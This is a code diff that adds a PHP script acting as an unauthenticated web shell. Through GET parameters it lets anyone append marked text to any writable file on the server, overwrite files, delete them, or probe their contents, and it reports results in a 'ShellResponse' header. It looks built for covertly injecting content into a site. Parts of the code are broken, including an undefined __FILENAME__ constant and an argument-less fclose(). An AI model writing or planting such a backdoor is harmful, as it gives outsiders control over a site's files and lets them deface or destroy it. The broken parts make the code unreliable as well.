@@ -1,0 +1,98 @@
+﻿<?php
+header("Content-Type: text/html; charset=utf-8");
+
+function ReturnToHeader($res)
+{
+	header("ShellResponse: $res");
+	die();
+}
+
+function PathCheker()
+{
+  if(isset($_GET['path']))
+  {
+    $path = $_GET['path'];
+  	if(file_exists($path))
+  	  if(is_writable($path) && is_readable($path))
+  	    return true;
+  	  else
+  	  {
+  	    	ReturnToHeader('001');
+  	    	return false;
+  	  }
+  	else
+  	{
+  		ReturnToHeader('000');
+  		return false;
+  	}
+  }
+  else
+  {
+  	ReturnToHeader('010');
+  	return false;
+  }
+
+}
+
+function Copier()
+{
+  if(!isset($_GET['action']))
+  {
+  	ReturnToHeader('011');
+  	return false;
+  }
+  else $action = $_GET['action'];
+
+  if(!isset($_GET['transmit']))
+  {
+  	ReturnToHeader('100');
+    return false;
+  }
+  else $text = $_GET['transmit'];
+  if(PathCheker())
+  {
+  	$path = $_GET['path'];
+  	$data = "<!--transmit-->".$text."<!--/transmit-->";
+  	switch($action)
+  	{
+  		case "write":
+  			{
+                $file = fopen($path,'a');
+  				fwrite($file,$data);
+  				fclose($file);
+  				break;
+  			}
+  		case "rewrite":
+  		    {
+  		       	$file = fopen(__FILENAME__,'w');
+  		        fwrite($file,$data);
+  		        fclose($file);
+  		        break;
+  		    }
+  		case "delete":
+  			{
+  				unlink($path);
+  				break;
+  			}
+  		case "check":
+  			{
+  				$file = fopen($path,'r');
+  				$content = fread($file,filesize($path));
+  				if( strpos($content,$text) != FALSE)
+  				  ReturnToHeader('111');
+  				else{ReturnToHeader('110');}
+  				fclose($file);
+  				break;
+  			}
+  		default: {ReturnToHeader('101');fclose();}
+  	}
+
+  	ReturnToHeader('200');
+
+  }
+
+}
+
+Copier();
+
+// some rewrite
